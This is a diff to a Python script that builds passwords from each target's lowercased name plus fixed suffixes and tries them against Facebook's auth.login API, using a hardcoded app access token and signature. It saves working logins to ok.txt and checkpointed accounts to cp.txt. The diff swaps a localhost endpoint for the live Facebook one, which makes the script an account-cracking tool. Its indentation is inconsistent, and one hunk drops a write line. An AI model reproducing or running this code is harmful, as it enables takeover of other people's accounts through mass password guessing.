@@ -359,50 +359,50 @@ def a_menu_select():
 		uid,name=user.split("|")
 		try:
 		    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                     q = json.loads(data)
-                    if 'loc' in q:
+                    if "access_token" in q:
                         print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1+" | "+name)
-                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass1 + '\n')
+                        ok=open("ok.txt","a")
+                        ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
                         print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1+" | "+name)
-                        cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass1 + '\n')
+                        cp=open("cp.txt","a")
+                        cp.write(uid+" | "+pass1+"\n")
                         cp.close()
                         cps.append(uid + pass1)
 		    else:
 			pass2 = name.lower() + p2
-		        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                         q = json.loads(data)
-                        if 'loc' in q:
+                        if "access_token" in q:
                             print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2+" | "+name)
-                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass2 + '\n')
+                            ok=open("ok.txt","a")
+                            ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
                             print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2+" | "+name)
-                            cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass2 + '\n')
+                            cp=open("cp.txt","a")
+                            cp.write(uid+" | "+pass2+"\n")
                             cp.close()
                             cps.append(uid + pass2)
 		        else:
 			    pass3 = name.lower() + p3
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                             q = json.loads(data)
-                            if 'loc' in q:
+                            if "access_token" in q:
                                 print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3+" | "+name)
                                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass3 + '\n')
+                                ok=open("ok.txt","a")
                                 ok.close()
                                 oks.append(uid + pass3)
                             elif 'www.facebook.com' in q['error']:
                                 print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3+" | "+name)
-                                cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass3 + '\n')
+                                cp=open("cp.txt","a")
+                                cp.write(uid+" | "+pass3+"\n")
                                 cp.close()
 				cps.append(uid + pass3)								
 		except:
@@ -571,48 +571,48 @@ def b_menu_select():
 		user=arg
 		uid,name=user.split('|')
 		try:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                     q = json.loads(data)
-                    if 'loc' in q:
+                    if "access_token" in q:
                         print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1+" | "+name)
-                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass1 + '\n')
+                        ok=open("ok.txt","a")
+                        ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
                         print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1+" | "+name)
-                        cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass1 + '\n')
+                        cp=open("cp.txt","a")
+                        cp.write(uid+" | "+pass1+"\n")
                         cp.close()
                         cps.append(uid + pass1)
 		    else:
-		        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                         q = json.loads(data)
-                        if 'loc' in q:
+                        if "access_token" in q:
                             print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2+" | "+name)
-                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass2 + '\n')
+                            ok=open("ok.txt","a")
+                            ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
                             print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2+" | "+name)
-                            cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass2 + '\n')
+                            cp=open("cp.txt","a")
+                            cp.write(uid+" | "+pass2+"\n")
                             cp.close()
                             cps.append(uid + pass2)
 		        else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                             q = json.loads(data)
-                            if 'loc' in q:
+                            if "access_token" in q:
                                 print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3+" | "+name)
-                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass3 + '\n')
+                                ok=open("ok.txt","a")
+                                ok.write(uid+" | "+pass3+"\n")
                                 ok.close()
                                 oks.append(uid + pass3)
                             elif 'www.facebook.com' in q['error']:
                                 print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3+" | "+name)
-                                cp = open('/sdcard/ids/jam_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass3 + '\n')
+                                cp=open("cp.txt","a")
+                                cp.write(uid+" | "+pass3+"\n")
                                 cp.close()
 				cps.append(uid + pass3)									
 		except:
